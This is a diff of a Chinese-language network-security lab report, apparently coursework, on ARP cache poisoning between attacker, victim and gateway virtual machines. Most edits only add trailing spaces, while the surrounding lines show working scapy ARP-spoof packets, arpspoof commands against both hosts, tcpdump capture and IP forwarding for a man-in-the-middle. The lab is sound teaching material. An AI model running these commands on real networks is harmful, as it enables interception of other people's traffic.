@@ -14,7 +14,7 @@
     * Kali-Attackter-1  
     * Kali-victim-1 
     * debian-gw
-* 实验拓扑图
+* 实验拓扑图  
 ![](imgs/structure.png) 
 * 在攻击者主机上提前安装好`scapy`
 ```bash
@@ -51,7 +51,7 @@ pkt = promiscping("192.168.0.102")
 # 手动关闭该网卡的「混杂模式」
 sudo ip link set enp0s3 promisc off
 ```
-两次输出结果如下图：
+两次输出结果如下图：  
 ![](imgs/promisc_on&off_pktping_cmp.png)  
 
 #### 实验二 手工单步“毒化”目标主机的ARP缓存
@@ -97,15 +97,15 @@ sendp(arpspoofed)
 ```bash
 arpspoofed=ARP(op=2, psrc="192.168.0.1", pdst="192.168.0.102", hwdst="08:00:27:bd:92:09")
 ```
-发现是不能毒化arp缓存表的，会出现以下情况：
-![](imgs/ppt_arp_gwchange.png)
-添加以太网头可以解决上面的问题：
+发现是不能毒化arp缓存表的，会出现以下情况：  
+![](imgs/ppt_arp_gwchange.png)   
+添加以太网头可以解决上面的问题：  
 ```bash
 arpspoofed=Ether()/ARP(op=2, psrc="192.168.0.1", pdst="192.168.0.102", hwdst="08:00:27:bd:92:09")
 ```
 ![](imgs/arp_gwchenge_success.png)  
 
-回到攻击者主机,恢复arp缓存表：
+回到攻击者主机,恢复arp缓存表：  
 ```bash
 # 恢复受害者主机的 ARP 缓存记录
 ## 伪装网关给受害者发送 ARP 响应
@@ -127,7 +127,7 @@ ip neigh
 
 #### 实验三 使用自动化工具完成ARP投毒劫持实验
 
-投毒前，查看Kali-Victim的arp缓存表：
+投毒前，查看Kali-Victim的arp缓存表：  
 ![](imgs/auto_arp_kalivic.png)
 查看网关Debian-gw的arp缓存表：
 ![](imgs/auto_arp_debiangw.png)
@@ -143,7 +143,7 @@ root@kali:~# arpspoof -i eth0 -t 172.16.111.102 172.16.111.1
 root@kali:~# arpspoof -i eth0 -t 172.16.111.1 172.16.111.102
 ```
 
-再次查看Kali-victim-1和debian-gw的arp缓存表：
+再次查看Kali-victim-1和debian-gw的arp缓存表：  
 ![](imgs/auto_kalivic_gwchange.png)  
 * 从上图可以看到Kali-Attackter成功毒化了Kali-victim-1的arp缓存表，将Debian-gw的Mac地址换成了Kali-Attackter的Mac地址。
 ![](imgs/auto_debiangw_kalivicchange.png)  
@@ -159,7 +159,7 @@ root@kali:~# tcpdump -i eth0 -w /home/kali/Desktop/test.pcap
 ![](imgs/test_pcap.png)
 观察发出请求主机上的命令行，发现并没有成功的通信，说明这个毒化是不完整的，能够抓到包，但是不能还原原有的正常通信，只有挂起（ctrl+z）或者结束欺骗（ctrl+c）以后才能正常上网：
 ![](imgs/ping_failure.png)
-打开Kali-Attackter的流量转发，目的是让攻击者（中间人）转发收到的包到真正的目的地址：
+在投毒前打开Kali-Attackter的流量转发，目的是让攻击者（中间人）转发收到的包到真正的目的地址，攻击者成为真正的中间人：
 ```bash
 root@kali:~# echo 1 > /proc/sys/net/ipv4/ip_forward
 ```
